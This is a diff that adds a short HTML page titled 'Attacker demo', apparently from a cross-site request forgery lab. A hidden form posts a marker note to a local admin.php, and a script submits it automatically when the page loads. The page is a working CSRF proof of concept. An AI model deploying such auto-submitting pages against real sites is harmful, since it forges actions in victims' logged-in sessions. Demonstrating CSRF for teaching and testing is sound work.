@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+  <body>
+    <h1>Attacker demo</h1>
+
+    <form action="http://127.0.0.1:8081/admin.php" method="POST" id="f">
+      <input type="hidden" name="note" value="CSRF_WAS_HERE">
+    </form>
+
+    <script>
+      document.getElementById('f').submit();
+    </script>
+  </body>
+</html>
